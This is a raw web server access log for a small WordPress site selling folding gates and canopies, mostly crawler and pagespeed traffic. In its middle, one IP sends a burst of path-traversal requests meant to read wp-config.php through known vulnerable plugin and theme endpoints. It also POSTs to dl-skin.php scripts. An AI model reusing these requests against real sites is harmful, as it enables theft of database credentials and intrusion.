128.199.122.79 - - [13/Mar/2015:17:17:32 +0000] "GET /wp-content/themes/twentyfifteen/js/functions.js?ver=20141212 HTTP/1.1" 304 0 "http://foldinggatebanten.com/wp-content/uploads/folding-gate-12-545x308.jpg/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:17:17:32 +0000] "GET /wp-includes/js/jquery/jquery.js?ver=1.11.1 HTTP/1.1" 304 0 "http://foldinggatebanten.com/wp-content/uploads/folding-gate-12-545x308.jpg/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:17:56:11 +0000] "GET /wp-content/themes/twentyfifteen/genericons/genericons.css?ver=3.2 HTTP/1.1" 304 0 "http://foldinggatebanten.com/?m=201411" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
66.249.67.40 - - [13/Mar/2015:17:56:11 +0000] "GET /?m=201411 HTTP/1.1" 200 2147 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
128.199.122.79 - - [13/Mar/2015:17:56:11 +0000] "GET /wp-content/themes/twentyfifteen/style.css?ver=4.1.1 HTTP/1.1" 304 0 "http://foldinggatebanten.com/?m=201411" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:17:56:11 +0000] "GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1 HTTP/1.1" 304 0 "http://foldinggatebanten.com/?m=201411" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:17:56:11 +0000] "GET /wp-content/themes/twentyfifteen/js/skip-link-focus-fix.js?ver=20141010 HTTP/1.1" 304 0 "http://foldinggatebanten.com/?m=201411" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:17:56:11 +0000] "GET /wp-content/themes/twentyfifteen/js/functions.js?ver=20141212 HTTP/1.1" 304 0 "http://foldinggatebanten.com/?m=201411" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:17:56:11 +0000] "GET /wp-includes/js/jquery/jquery.js?ver=1.11.1 HTTP/1.1" 304 0 "http://foldinggatebanten.com/?m=201411" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
66.249.71.68 - - [13/Mar/2015:18:12:55 +0000] "GET /wp-includes/css/dashicons.min.css?ver=4.1.1 HTTP/1.1" 200 27270 "http://foldinggatebanten.com/wp-login.php" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.71.102 - - [13/Mar/2015:18:12:56 +0000] "GET /wp-includes/css/buttons.min.css?ver=4.1.1 HTTP/1.1" 200 5979 "http://foldinggatebanten.com/wp-login.php" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.71.68 - - [13/Mar/2015:18:12:57 +0000] "GET /wp-admin/css/login.min.css?ver=4.1.1 HTTP/1.1" 200 4886 "http://foldinggatebanten.com/wp-login.php" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.180 - - [13/Mar/2015:18:21:33 +0000] "GET /robots.txt HTTP/1.1" 404 1806 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
5.255.253.92 - - [13/Mar/2015:19:31:36 +0000] "GET /robots.txt HTTP/1.1" 404 1806 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
128.199.122.79 - - [13/Mar/2015:19:33:42 +0000] "GET /wp-content/themes/twentyfifteen/genericons/genericons.css?ver=3.2 HTTP/1.1" 304 0 "http://foldinggatebanten.com/produk/pagar-stainless/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:19:33:42 +0000] "GET /wp-content/themes/twentyfifteen/style.css?ver=4.1.1 HTTP/1.1" 304 0 "http://foldinggatebanten.com/produk/pagar-stainless/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:19:33:42 +0000] "GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1 HTTP/1.1" 304 0 "http://foldinggatebanten.com/produk/pagar-stainless/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:19:33:42 +0000] "GET /wp-content/themes/twentyfifteen/js/skip-link-focus-fix.js?ver=20141010 HTTP/1.1" 304 0 "http://foldinggatebanten.com/produk/pagar-stainless/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:19:33:42 +0000] "GET /wp-content/themes/twentyfifteen/js/functions.js?ver=20141212 HTTP/1.1" 304 0 "http://foldinggatebanten.com/produk/pagar-stainless/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:19:33:42 +0000] "GET /wp-includes/js/jquery/jquery.js?ver=1.11.1 HTTP/1.1" 304 0 "http://foldinggatebanten.com/produk/pagar-stainless/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
180.76.5.144 - - [13/Mar/2015:19:33:42 +0000] "GET /produk/pagar-stainless/ HTTP/1.1" 200 2127 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
128.199.122.79 - - [13/Mar/2015:19:42:05 +0000] "POST /wp-cron.php?doing_wp_cron=1426275724.9873309135437011718750 HTTP/1.0" 200 20 "-" "WordPress/4.1.1; http://foldinggatebanten.com"
128.199.122.79 - - [13/Mar/2015:19:42:05 +0000] "GET /wp-content/themes/twentyfifteen/genericons/genericons.css?ver=3.2 HTTP/1.1" 304 0 "http://foldinggatebanten.com/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:19:42:05 +0000] "GET /wp-content/themes/twentyfifteen/style.css?ver=4.1.1 HTTP/1.1" 304 0 "http://foldinggatebanten.com/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:19:42:05 +0000] "GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1 HTTP/1.1" 304 0 "http://foldinggatebanten.com/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
92.63.110.237 - - [13/Mar/2015:19:42:05 +0000] "GET / HTTP/1.1" 200 2147 "http://addictedtodesign.com/wp-content/themes/dejavu/lib/scripts/dl-skin.php" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/12.0.702.0 Safari/534.24"
128.199.122.79 - - [13/Mar/2015:19:42:05 +0000] "GET /wp-content/themes/twentyfifteen/js/skip-link-focus-fix.js?ver=20141010 HTTP/1.1" 304 0 "http://foldinggatebanten.com/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:19:42:05 +0000] "GET /wp-content/themes/twentyfifteen/js/functions.js?ver=20141212 HTTP/1.1" 304 0 "http://foldinggatebanten.com/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:19:42:05 +0000] "GET /wp-includes/js/jquery/jquery.js?ver=1.11.1 HTTP/1.1" 304 0 "http://foldinggatebanten.com/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:19:42:05 +0000] "POST /wp-cron.php?doing_wp_cron=1426275724.9756720066070556640625 HTTP/1.0" 200 20 "-" "WordPress/4.1.1; http://foldinggatebanten.com"
92.63.110.237 - - [13/Mar/2015:19:42:05 +0000] "GET / HTTP/1.1" 200 2271 "http://3damigas.com/wp-content/themes/echelon/lib/scripts/dl-skin.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16"
92.63.110.237 - - [13/Mar/2015:19:42:06 +0000] "GET /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php HTTP/1.1" 200 32 "http://foldinggatebanten.com" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16"
92.63.110.237 - - [13/Mar/2015:19:42:06 +0000] "GET /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php HTTP/1.1" 200 32 "http://foldinggatebanten.com" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/12.0.702.0 Safari/534.24"
92.63.110.237 - - [13/Mar/2015:19:42:06 +0000] "POST /wp-content/themes/infocus/lib/scripts/dl-skin.php HTTP/1.1" 404 1806 "http://foldinggatebanten.com/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/12.0.702.0 Safari/534.24"
92.63.110.237 - - [13/Mar/2015:19:42:06 +0000] "POST /wp-content/themes/infocus/lib/scripts/dl-skin.php HTTP/1.1" 404 1806 "http://foldinggatebanten.com/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16"
92.63.110.237 - - [13/Mar/2015:19:42:06 +0000] "GET /wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php HTTP/1.1" 404 1806 "http://foldinggatebanten.com/wp-content/themes/infocus/lib/scripts/dl-skin.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16"
92.63.110.237 - - [13/Mar/2015:19:42:07 +0000] "GET /wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php HTTP/1.1" 404 1806 "http://foldinggatebanten.com/wp-content/themes/infocus/lib/scripts/dl-skin.php" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/12.0.702.0 Safari/534.24"
92.63.110.237 - - [13/Mar/2015:19:42:07 +0000] "POST /wp-content/themes/awake/lib/scripts/dl-skin.php HTTP/1.1" 404 1806 "http://foldinggatebanten.com/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16"
92.63.110.237 - - [13/Mar/2015:19:42:07 +0000] "POST /wp-content/themes/awake/lib/scripts/dl-skin.php HTTP/1.1" 404 1806 "http://foldinggatebanten.com/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/12.0.702.0 Safari/534.24"
92.63.110.237 - - [13/Mar/2015:19:42:07 +0000] "POST /wp-content/themes/echelon/lib/scripts/dl-skin.php HTTP/1.1" 404 1806 "http://foldinggatebanten.com/wp-content/themes/awake/lib/scripts/dl-skin.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16"
92.63.110.237 - - [13/Mar/2015:19:42:08 +0000] "POST /wp-content/themes/echelon/lib/scripts/dl-skin.php HTTP/1.1" 404 1806 "http://foldinggatebanten.com/wp-content/themes/awake/lib/scripts/dl-skin.php" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/12.0.702.0 Safari/534.24"
92.63.110.237 - - [13/Mar/2015:19:42:08 +0000] "GET /wp-admin/admin-ajax.php?action=getfile&/../../wp-config.php HTTP/1.1" 200 32 "http://foldinggatebanten.com/wp-content/themes/echelon/lib/scripts/dl-skin.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16"
92.63.110.237 - - [13/Mar/2015:19:42:08 +0000] "POST /wp-content/themes/dejavu/lib/scripts/dl-skin.php HTTP/1.1" 404 1806 "http://foldinggatebanten.com/wp-admin/admin-ajax.php?action=getfile&/../../wp-config.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16"
92.63.110.237 - - [13/Mar/2015:19:42:08 +0000] "GET /wp-admin/admin-ajax.php?action=getfile&/../../wp-config.php HTTP/1.1" 200 32 "http://foldinggatebanten.com/wp-content/themes/echelon/lib/scripts/dl-skin.php" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/12.0.702.0 Safari/534.24"
92.63.110.237 - - [13/Mar/2015:19:42:09 +0000] "POST /wp-content/themes/elegance/lib/scripts/dl-skin.php HTTP/1.1" 404 1806 "http://foldinggatebanten.com/wp-content/themes/dejavu/lib/scripts/dl-skin.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16"
92.63.110.237 - - [13/Mar/2015:19:42:09 +0000] "POST /wp-content/themes/dejavu/lib/scripts/dl-skin.php HTTP/1.1" 404 1806 "http://foldinggatebanten.com/wp-admin/admin-ajax.php?action=getfile&/../../wp-config.php" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/12.0.702.0 Safari/534.24"
92.63.110.237 - - [13/Mar/2015:19:42:09 +0000] "GET /wp-content/plugins/db-backup/download.php?file=../../../wp-config.php HTTP/1.1" 404 1806 "http://foldinggatebanten.com/wp-content/themes/elegance/lib/scripts/dl-skin.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16"
92.63.110.237 - - [13/Mar/2015:19:42:10 +0000] "POST /wp-content/themes/elegance/lib/scripts/dl-skin.php HTTP/1.1" 404 1806 "http://foldinggatebanten.com/wp-content/themes/dejavu/lib/scripts/dl-skin.php" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/12.0.702.0 Safari/534.24"
92.63.110.237 - - [13/Mar/2015:19:42:10 +0000] "GET /wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php HTTP/1.1" 404 1806 "http://foldinggatebanten.com/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16"
92.63.110.237 - - [13/Mar/2015:19:42:10 +0000] "GET /wp-content/plugins/db-backup/download.php?file=../../../wp-config.php HTTP/1.1" 404 1806 "http://foldinggatebanten.com/wp-content/themes/elegance/lib/scripts/dl-skin.php" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/12.0.702.0 Safari/534.24"
92.63.110.237 - - [13/Mar/2015:19:42:10 +0000] "GET /wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php HTTP/1.1" 404 1806 "http://foldinggatebanten.com/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/12.0.702.0 Safari/534.24"
128.199.122.79 - - [13/Mar/2015:20:08:51 +0000] "GET /wp-content/themes/twentyfifteen/genericons/genericons.css?ver=3.2 HTTP/1.1" 304 0 "http://foldinggatebanten.com/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
5.255.253.92 - - [13/Mar/2015:20:08:51 +0000] "GET / HTTP/1.1" 200 2118 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
128.199.122.79 - - [13/Mar/2015:20:08:51 +0000] "GET /wp-content/themes/twentyfifteen/style.css?ver=4.1.1 HTTP/1.1" 304 0 "http://foldinggatebanten.com/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:20:08:51 +0000] "GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1 HTTP/1.1" 304 0 "http://foldinggatebanten.com/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:20:08:51 +0000] "GET /wp-content/themes/twentyfifteen/js/skip-link-focus-fix.js?ver=20141010 HTTP/1.1" 304 0 "http://foldinggatebanten.com/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:20:08:51 +0000] "GET /wp-content/themes/twentyfifteen/js/functions.js?ver=20141212 HTTP/1.1" 304 0 "http://foldinggatebanten.com/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:20:08:51 +0000] "GET /wp-includes/js/jquery/jquery.js?ver=1.11.1 HTTP/1.1" 304 0 "http://foldinggatebanten.com/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
66.249.71.68 - - [13/Mar/2015:20:14:21 +0000] "GET /?cat=1 HTTP/1.1" 200 2169 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
128.199.122.79 - - [13/Mar/2015:20:14:21 +0000] "GET /wp-content/themes/twentyfifteen/genericons/genericons.css?ver=3.2 HTTP/1.1" 304 0 "http://foldinggatebanten.com/?cat=1" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:20:14:21 +0000] "GET /wp-content/themes/twentyfifteen/style.css?ver=4.1.1 HTTP/1.1" 304 0 "http://foldinggatebanten.com/?cat=1" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:20:14:21 +0000] "GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1 HTTP/1.1" 304 0 "http://foldinggatebanten.com/?cat=1" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:20:14:21 +0000] "GET /wp-content/themes/twentyfifteen/js/skip-link-focus-fix.js?ver=20141010 HTTP/1.1" 304 0 "http://foldinggatebanten.com/?cat=1" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:20:14:21 +0000] "GET /wp-content/themes/twentyfifteen/js/functions.js?ver=20141212 HTTP/1.1" 304 0 "http://foldinggatebanten.com/?cat=1" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:20:14:21 +0000] "GET /wp-includes/js/jquery/jquery.js?ver=1.11.1 HTTP/1.1" 304 0 "http://foldinggatebanten.com/?cat=1" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
66.249.67.32 - - [13/Mar/2015:20:15:07 +0000] "GET /wp-content/themes/twentyfifteen/genericons/A.genericons.css,qver=3.2.pagespeed.cf.NPz-yIFsxm.css HTTP/1.1" 200 16159 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
128.199.122.79 - - [13/Mar/2015:20:33:28 +0000] "POST /wp-cron.php?doing_wp_cron=1426278808.0508129596710205078125 HTTP/1.0" 499 0 "-" "WordPress/4.1.1; http://foldinggatebanten.com"
128.199.122.79 - - [13/Mar/2015:20:33:29 +0000] "GET /wp-content/themes/twentyfifteen/genericons/genericons.css?ver=3.2 HTTP/1.1" 304 0 "http://foldinggatebanten.com/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
66.249.67.40 - - [13/Mar/2015:20:33:29 +0000] "GET / HTTP/1.1" 200 2118 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
128.199.122.79 - - [13/Mar/2015:20:33:29 +0000] "GET /wp-content/themes/twentyfifteen/style.css?ver=4.1.1 HTTP/1.1" 304 0 "http://foldinggatebanten.com/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:20:33:29 +0000] "GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1 HTTP/1.1" 304 0 "http://foldinggatebanten.com/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:20:33:29 +0000] "GET /wp-content/themes/twentyfifteen/js/skip-link-focus-fix.js?ver=20141010 HTTP/1.1" 304 0 "http://foldinggatebanten.com/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:20:33:29 +0000] "GET /wp-content/themes/twentyfifteen/js/functions.js?ver=20141212 HTTP/1.1" 304 0 "http://foldinggatebanten.com/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:20:33:29 +0000] "GET /wp-includes/js/jquery/jquery.js?ver=1.11.1 HTTP/1.1" 304 0 "http://foldinggatebanten.com/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
180.76.5.188 - - [13/Mar/2015:20:48:09 +0000] "GET /produk/rolling-door-untuk-pabrik/feed/ HTTP/1.1" 301 5 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
128.199.122.79 - - [13/Mar/2015:20:48:09 +0000] "GET /wp-content/themes/twentyfifteen/genericons/genericons.css?ver=3.2 HTTP/1.1" 304 0 "http://foldinggatebanten.com/produk/rolling-door-untuk-pabrik/feed/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:20:48:09 +0000] "GET /wp-content/themes/twentyfifteen/style.css?ver=4.1.1 HTTP/1.1" 304 0 "http://foldinggatebanten.com/produk/rolling-door-untuk-pabrik/feed/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:20:48:09 +0000] "GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1 HTTP/1.1" 304 0 "http://foldinggatebanten.com/produk/rolling-door-untuk-pabrik/feed/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:20:48:09 +0000] "GET /wp-content/themes/twentyfifteen/js/skip-link-focus-fix.js?ver=20141010 HTTP/1.1" 304 0 "http://foldinggatebanten.com/produk/rolling-door-untuk-pabrik/feed/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:20:48:09 +0000] "GET /wp-content/themes/twentyfifteen/js/functions.js?ver=20141212 HTTP/1.1" 304 0 "http://foldinggatebanten.com/produk/rolling-door-untuk-pabrik/feed/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:20:48:09 +0000] "GET /wp-includes/js/jquery/jquery.js?ver=1.11.1 HTTP/1.1" 304 0 "http://foldinggatebanten.com/produk/rolling-door-untuk-pabrik/feed/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
180.76.5.67 - - [13/Mar/2015:20:48:09 +0000] "GET /produk/rolling-door-untuk-pabrik/feed/ HTTP/1.1" 200 2147 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
128.199.122.79 - - [13/Mar/2015:21:07:24 +0000] "GET /wp-content/themes/twentyfifteen/genericons/genericons.css?ver=3.2 HTTP/1.1" 304 0 "http://foldinggatebanten.com/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
180.76.4.98 - - [13/Mar/2015:21:07:24 +0000] "GET / HTTP/1.1" 200 6602 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
128.199.122.79 - - [13/Mar/2015:21:07:24 +0000] "GET /wp-content/themes/twentyfifteen/style.css?ver=4.1.1 HTTP/1.1" 304 0 "http://foldinggatebanten.com/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:21:07:24 +0000] "GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1 HTTP/1.1" 304 0 "http://foldinggatebanten.com/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:21:07:24 +0000] "GET /wp-content/themes/twentyfifteen/js/skip-link-focus-fix.js?ver=20141010 HTTP/1.1" 304 0 "http://foldinggatebanten.com/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:21:07:24 +0000] "GET /wp-content/themes/twentyfifteen/js/functions.js?ver=20141212 HTTP/1.1" 304 0 "http://foldinggatebanten.com/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:21:07:24 +0000] "GET /wp-includes/js/jquery/jquery.js?ver=1.11.1 HTTP/1.1" 304 0 "http://foldinggatebanten.com/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:21:18:16 +0000] "GET /wp-content/themes/twentyfifteen/genericons/genericons.css?ver=3.2 HTTP/1.1" 304 0 "http://foldinggatebanten.com/produk/harga-canopy/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:21:18:16 +0000] "GET /wp-content/themes/twentyfifteen/style.css?ver=4.1.1 HTTP/1.1" 304 0 "http://foldinggatebanten.com/produk/harga-canopy/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:21:18:16 +0000] "GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1 HTTP/1.1" 304 0 "http://foldinggatebanten.com/produk/harga-canopy/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:21:18:16 +0000] "GET /wp-content/themes/twentyfifteen/js/skip-link-focus-fix.js?ver=20141010 HTTP/1.1" 304 0 "http://foldinggatebanten.com/produk/harga-canopy/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:21:18:16 +0000] "GET /wp-content/themes/twentyfifteen/js/functions.js?ver=20141212 HTTP/1.1" 304 0 "http://foldinggatebanten.com/produk/harga-canopy/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
128.199.122.79 - - [13/Mar/2015:21:18:16 +0000] "GET /wp-includes/js/jquery/jquery.js?ver=1.11.1 HTTP/1.1" 304 0 "http://foldinggatebanten.com/produk/harga-canopy/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
180.76.5.167 - - [13/Mar/2015:21:18:16 +0000] "GET /produk/harga-canopy/ HTTP/1.1" 200 2127 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.5.223 - - [13/Mar/2015:21:18:17 +0000] "GET /produk/harga-canopy/ HTTP/1.1" 301 5 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
128.199.122.79 - - [13/Mar/2015:21:52:46 +0000] "GET /wp-content/themes/twentyfifteen/genericons/genericons.css?ver=3.2 HTTP/1.1" 304 0 "http://foldinggatebanten.com/" "Serf/1.1.0 mod_pagespeed/1.9.32.3-4448"
